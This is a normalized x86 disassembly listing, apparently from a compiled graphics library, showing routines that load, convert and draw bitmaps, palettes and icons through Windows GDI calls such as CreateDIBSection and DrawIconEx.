mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_422d49
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_422d1c
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b18
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_41de14
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_415c60
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402b18
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_415bf0
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_41e0a4
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41e0c4
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_415bf0
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_41df34
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_422c97
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_41e36c
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026bc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_422bff
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_415bf0
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_41df34
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_422bd3
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41e624
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40cb1c
call sub_41de14
jmp r-xdata
xor eax eax
push ebp
push sub_422c66
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_415bf0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422bda
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422c9e
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40cb1c
call sub_41de14
jmp r-xdata
sub_422bda
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026dc
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_422c9e
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402b18
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_422d33
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41e624
mov [ ebp - 0x30 ] eax
sub_422d50
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_422704
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_422d94
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_422434
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_415bf0
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402b18
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_422704
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_42282c
call sub_41de14
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_422e04
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_422434
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b18
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_421a4c
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_422e9f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_422704
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_422ec8
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_4222f0
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_422434
mov eax esi
call sub_422544
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_422434
mov eax esi
call sub_422544
mov eax esi
call sub_4223c0
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_421a4c
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_421e50
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_422704
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_422704
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_4213e8
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423000
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_422444
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_421e50
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423054
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_422444
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_421e50
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4230d4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_422434
mov eax ebx
call sub_422444
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_4213e8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42316b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_422704
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_4212e0
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_41be98
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_423170
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_4038b8
call sub_40390c
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_4212e0
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4231a8
push ebx
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
cmp edx 0x20000000
jne r-xdata
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x38 ] 0x0
jmp r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax esi
call sub_422444
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_421e50
mov [ esi + 0x34 ] edx
mov eax [ esi + 0x28 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
sub_4231f8
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_422444
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_421e50
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423254
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b18
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_4223c0
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_41ed78
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_415c28
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_415c28
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b18
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_422284
mov dl [ r-xdata ]
call sub_41dc10
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_41df34
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_42139c
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_415c28
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_415c28
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_415c28
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_415c28
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_415c28
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_415c28
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_41e3a4
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_415c28
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_41e6c8
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_423514
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_422444
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_4213e8
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push j_sub_4035a4#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_421a4c
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4235b4
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_4235fc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41f0b4
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_421214
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_423650
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_421218
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4142fc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_423680
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_423958
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_421214
mov eax [ esi + 0x28 ]
call sub_421218
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_414328
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_4236e0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_41dc10
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_423738
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_423774
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_4159e4
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_415bf0
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_41e974
jmp r-xdata
jmp r-xdata
call sub_41de20
sub_4237ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423879
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_423738
cmp eax [ rw-data ]
jne r-xdata
call sub_41de20
mov eax esi
call sub_423738
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_41eeb8
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402b18
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_415c28
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4238a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42392e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_4159c4
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_415bf0
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_415bf0
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_423958
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_41de20
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423933
mov eax [ ebp - 0x4 ]
call sub_403104
